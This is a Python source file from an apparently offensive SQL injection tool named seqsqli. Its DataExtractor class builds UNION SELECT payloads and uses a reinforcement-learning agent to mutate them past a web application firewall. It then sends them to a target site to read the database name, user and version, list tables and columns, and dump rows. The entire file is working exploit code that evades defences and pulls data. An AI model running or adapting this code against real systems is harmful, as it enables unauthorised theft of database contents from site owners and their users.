"""
seqsqli/extractor.py
=====================
DataExtractor: uses the trained RL agent (greedy policy) to build
evasive payloads and extract database content.
"""

import time
from typing import List, Optional

from seqsqli.config import MAX_STEPS, REQUEST_DELAY
from seqsqli.core.profile import TargetProfile
from seqsqli.core.http import send_request
from seqsqli.core.mutations import MUTATIONS, ACTION_LIST
from seqsqli.core.response import classify_response, extract_between_markers
from seqsqli.rl.state import encode_state
from seqsqli.rl.qlearning import Q

class DataExtractor:
    """
    Extract actual database content using the trained RL agent
    to build evasive payloads.
    """

    def __init__(self, target: TargetProfile, verbose: bool = True):
        self.target = target
        self.verbose = verbose

    def log(self, msg: str):
        if self.verbose:
            print(f"  [EXTRACT] {msg}")

    def _pick_inject_col(self) -> int:
        """Pick the best column for data extraction.
        Avoids the last column when quote-closing suffix is needed."""
        n = self.target.columns
        q = self.target.quote
        suffix = self.target.suffix

        needs_quote_close = (
            suffix == "QUOTE_CLOSE"
            or (suffix not in ("--+", "-- -", "#", "%23", ";%00")
                and q and q not in ("%bf%27",))
        )

        candidates = self.target.injectable_cols if self.target.injectable_cols else list(range(2, min(n + 1, 4)))

        if needs_quote_close and n > 1:
            # Exclude the last column (reserved for quote-closing)
            candidates = [c for c in candidates if c != n]
            if not candidates:
                # All injectable cols are the last col — use col before it
                candidates = [max(1, n - 1)]

        return candidates[0] if candidates else 2

    def _build_extract_payload(self, sql_expr: str) -> str:
        """Build a UNION SELECT payload that extracts sql_expr in a marked column."""
        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix
        n = self.target.columns
        inject_col = self._pick_inject_col()

        # Check if we need quote-closing suffix
        needs_quote_close = (
            suffix == "QUOTE_CLOSE"
            or (suffix not in ("--+", "-- -", "#", "%23", ";%00")
                and q and q not in ("%bf%27",))
        )

        cols = []
        for i in range(1, n + 1):
            if i == inject_col:
                cols.append(f"CONCAT(0x7e7e53544152547e7e,({sql_expr}),0x7e7e454e447e7e)")
            elif needs_quote_close and i == n:
                # Last column closes the quote context
                cols.append(f"{q}{i}")
            else:
                cols.append(str(i))

        if needs_quote_close:
            return f"0{q}{c} UNION SELECT {','.join(cols)}"
        else:
            return f"0{q}{c} UNION SELECT {','.join(cols)}{suffix}"

    def _apply_best_mutations(self, payload: str) -> str:
        """Apply the learned mutation sequence (greedy) to bypass WAF."""
        state = encode_state("INIT", "none", 0, payload)
        current = payload

        for step in range(MAX_STEPS):
            action = max(ACTION_LIST, key=lambda a: Q[(state, a)])
            mutated = MUTATIONS[action](current)

            # Don't mutate if nothing changed (avoid loops)
            if mutated == current:
                break

            resp, status = send_request(self.target, mutated)
            result = classify_response(resp, status)

            # Check if data is extractable
            extracted = extract_between_markers(resp)
            if extracted is not None:
                return mutated  # this mutation chain works

            if result == "SUCCESS":
                return mutated

            next_state = encode_state(result, action, step + 1, mutated)
            current = mutated
            state = next_state
            time.sleep(REQUEST_DELAY)

        return current

    def _send_extract(self, sql_expr: str) -> Optional[str]:
        """Build payload, mutate to bypass WAF, extract data."""
        raw = self._build_extract_payload(sql_expr)
        mutated = self._apply_best_mutations(raw)

        resp, status = send_request(self.target, mutated)
        data = extract_between_markers(resp)

        if data is None:
            # Try the raw payload without mutations (for unfiltered targets)
            resp, status = send_request(self.target, raw)
            data = extract_between_markers(resp)

        return data

    def get_current_db(self) -> Optional[str]:
        """Extract current database name."""
        self.log("Extracting current database...")
        result = self._send_extract("database()")
        if result:
            self.log(f"Current database: {result}")
        else:
            self.log("Failed to extract database name")
        return result

    def get_current_user(self) -> Optional[str]:
        """Extract current user."""
        self.log("Extracting current user...")
        result = self._send_extract("user()")
        if result:
            self.log(f"Current user: {result}")
        return result

    def get_version(self) -> Optional[str]:
        """Extract MySQL version."""
        self.log("Extracting version...")
        result = self._send_extract("version()")
        if result:
            self.log(f"Version: {result}")
        return result

    def get_tables(self, database: str = None) -> List[str]:
        """Extract table names from a database."""
        if database is None:
            database = self.get_current_db()
        if not database:
            return []

        self.log(f"Extracting tables from '{database}'...")
        sql = (
            f"GROUP_CONCAT(table_name SEPARATOR 0x2c) "
            f"FROM information_schema.tables "
            f"WHERE table_schema=0x{database.encode().hex()}"
        )
        result = self._send_extract(sql)
        if result:
            tables = result.split(",")
            self.log(f"Tables: {tables}")
            return tables
        return []

    def get_columns(self, table: str, database: str = None) -> List[str]:
        """Extract column names from a table."""
        if database is None:
            database = self.get_current_db()
        if not database:
            return []

        self.log(f"Extracting columns from '{table}'...")
        sql = (
            f"GROUP_CONCAT(column_name SEPARATOR 0x2c) "
            f"FROM information_schema.columns "
            f"WHERE table_schema=0x{database.encode().hex()} "
            f"AND table_name=0x{table.encode().hex()}"
        )
        result = self._send_extract(sql)
        if result:
            columns = result.split(",")
            self.log(f"Columns: {columns}")
            return columns
        return []

    def dump_table(self, table: str, columns: List[str] = None,
                   database: str = None, limit: int = 10) -> List[str]:
        """Dump rows from a table."""
        if database is None:
            database = self.get_current_db()

        if columns is None:
            columns = self.get_columns(table, database)
        if not columns:
            self.log(f"No columns found for {table}")
            return []

        self.log(f"Dumping {table} ({','.join(columns[:5])}) LIMIT {limit}...")
        cols_concat = ",0x3a,".join(columns[:5])  # join with ':'
        sql = (
            f"GROUP_CONCAT({cols_concat} SEPARATOR 0x0a) "
            f"FROM {database}.{table} LIMIT {limit}"
        )
        result = self._send_extract(sql)
        if result:
            rows = result.split("\n")
            for row in rows[:10]:
                self.log(f"  {row}")
            return rows
        return []

    def run_full_extraction(self) -> dict:
        """Run complete enumeration: db -> tables -> columns -> dump."""
        report = {}

        report["user"] = self.get_current_user()
        report["version"] = self.get_version()
        report["database"] = self.get_current_db()

        if report["database"]:
            tables = self.get_tables(report["database"])
            report["tables"] = {}
            for table in tables[:10]:  # limit to first 10 tables
                cols = self.get_columns(table, report["database"])
                rows = self.dump_table(table, cols, report["database"], limit=5)
                report["tables"][table] = {"columns": cols, "sample_rows": rows}
                time.sleep(REQUEST_DELAY)

        return report

